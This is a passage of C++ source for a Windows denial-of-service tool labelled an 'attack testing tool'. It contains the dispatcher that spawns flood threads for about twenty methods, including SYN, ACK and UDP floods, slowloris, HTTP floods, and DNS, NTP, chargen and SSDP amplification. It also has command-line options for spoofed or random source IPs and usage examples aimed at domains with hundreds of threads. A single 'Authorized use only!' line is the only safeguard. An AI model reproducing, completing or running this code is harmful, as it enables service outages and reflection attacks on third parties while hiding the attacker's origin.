    logInfo("Target: " + target.host + " (" + target.ip + ")");
    logInfo("Port: " + to_string(target.port));
    logInfo("Method: " + target.method);
    logInfo("Duration: " + to_string(target.duration) + "s");
    logInfo("Threads: " + to_string(target.threads));

    if (target.random_spoof) {
        logInfo("Spoof IP: random");
    }
    else if (!target.spoof_ip.empty()) {
        logInfo("Spoof IP: " + target.spoof_ip);
    }

    stats.running = true;

    vector<thread> threads;

    if (target.method == "icmp") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(icmpFlood);
    }
    else if (target.method == "udp") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(udpFlood);
    }
    else if (target.method == "udpfrag") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(udpFragmentFlood);
    }
    else if (target.method == "syn") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(synFlood);
    }
    else if (target.method == "ack") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(ackFlood);
    }
    else if (target.method == "rst") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(rstFlood);
    }
    else if (target.method == "fin") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(finFlood);
    }
    else if (target.method == "tcpfrag") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(tcpFragmentFlood);
    }
    else if (target.method == "tcpconn") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(tcpFlood);
    }
    else if (target.method == "tcpstress") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(tcpSockStress);
    }
    else if (target.method == "http") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(httpFlood);
    }
    else if (target.method == "https") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(httpsFlood);
    }
    else if (target.method == "slowloris") {
        threads.emplace_back(slowloris);
    }
    else if (target.method == "slowbody") {
        threads.emplace_back(slowBody);
    }
    else if (target.method == "post") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(postFlood);
    }
    else if (target.method == "dns") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(dnsAmplification);
    }
    else if (target.method == "ntp") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(ntpAmplification);
    }
    else if (target.method == "chargen") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(chargenAmplification);
    }
    else if (target.method == "ssdp") {
        for (int i = 0; i < target.threads; i++) threads.emplace_back(ssdpAmplification);
    }

    thread statsThread(showStats);

    this_thread::sleep_for(chrono::seconds(target.duration));

    stats.running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    if (statsThread.joinable()) statsThread.join();

    logSuccess("Attack completed");
    logInfo("Packets: " + to_string(stats.packets));
    logInfo("Bytes: " + to_string(stats.bytes / 1024 / 1024) + " MB");
    logInfo("Connections: " + to_string(stats.conns));
}

bool parseArgs(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " -t <target> -m <method> [options]\n";
        cout << "\nLAYER 3 ATTACKS:\n";
        cout << "  icmp      - ICMP echo request flood\n";
        cout << "  udp       - UDP flood\n";
        cout << "  udpfrag   - UDP fragment flood\n";
        cout << "\nLAYER 4 ATTACKS:\n";
        cout << "  syn       - SYN flood\n";
        cout << "  ack       - ACK flood\n";
        cout << "  rst       - RST flood\n";
        cout << "  fin       - FIN flood\n";
        cout << "  tcpfrag   - TCP fragment flood\n";
        cout << "  tcpconn   - TCP connection flood\n";
        cout << "  tcpstress - TCP socket stress\n";
        cout << "\nLAYER 7 ATTACKS:\n";
        cout << "  http      - HTTP GET flood\n";
        cout << "  https     - HTTPS flood\n";
        cout << "  slowloris - Slowloris\n";
        cout << "  slowbody  - Slow body attack\n";
        cout << "  post      - POST flood\n";
        cout << "  dns       - DNS amplification\n";
        cout << "  ntp       - NTP amplification\n";
        cout << "  chargen   - Chargen amplification\n";
        cout << "  ssdp      - SSDP amplification\n";
        cout << "\nOptions:\n";
        cout << "  -t <target>       Target IP or domain\n";
        cout << "  -m <method>       Attack method\n";
        cout << "  -p <port>         Target port (default: 80)\n";
        cout << "  -d <sec>          Duration in seconds (default: 10)\n";
        cout << "  -c <threads>      Threads (default: 1, max: " << MAX_THREADS << ")\n";
        cout << "  --path <path>     HTTP path (default: /)\n";
        cout << "  --spoof <ip>      Spoof source IP\n";
        cout << "  --random-spoof    Random source IP\n";
        cout << "\nExamples:\n";
        cout << "  " << argv[0] << " -t 192.168.1.1 -m icmp -d 30 -c 4\n";
        cout << "  " << argv[0] << " -t example.com -m syn -p 80 -d 60 -c 100 --random-spoof\n";
        cout << "  " << argv[0] << " -t example.com -m slowloris -p 80 -d 120 -c 500\n";
        return false;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            target.host = argv[++i];
            if (!resolveHost(target.host, target.ip)) {
                logError("Cannot resolve: " + target.host);
                return false;
            }
        }
        else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            target.method = argv[++i];
        }
        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            target.port = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            target.duration = atoi(argv[++i]);
        }
        else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            target.threads = atoi(argv[++i]);
            if (target.threads > MAX_THREADS) target.threads = MAX_THREADS;
            if (target.threads < 1) target.threads = 1;
        }
        else if (strcmp(argv[i], "--path") == 0 && i + 1 < argc) {
            target.path = argv[++i];
        }
        else if (strcmp(argv[i], "--spoof") == 0 && i + 1 < argc) {
            target.spoof_ip = argv[++i];
        }
        else if (strcmp(argv[i], "--random-spoof") == 0) {
            target.random_spoof = true;
        }
    }

    if (target.host.empty() || target.method.empty()) {
        logError("Target and method required");
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    SetConsoleTitle(TEXT("Multi-Layer Attack Testing Tool"));

    logFile.open("attack_log.txt", ios::app);
    if (!logFile.is_open()) {
        cout << "Cannot open log file\n";
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        logError("Winsock failed");
        return 1;
    }

    srand((unsigned int)time(nullptr));

    if (!parseArgs(argc, argv)) {
        WSACleanup();
        logFile.close();
        cout << "\nPress any key...";
        cin.get();
        return 1;
    }

    logWarning("Authorized use only!");
    logWarning("Target: " + target.host + " (" + target.ip + ")");
    logWarning("Method: " + target.method);
    logWarning("Duration: " + to_string(target.duration) + " seconds");
    logWarning("Threads: " + to_string(target.threads));

    cout << "\nPress Enter to start...";
    cin.get();

    runAttack();

    logFile.close();
    WSACleanup();

    cout << "\nPress any key to exit...";
    cin.get();

    return 0;
}
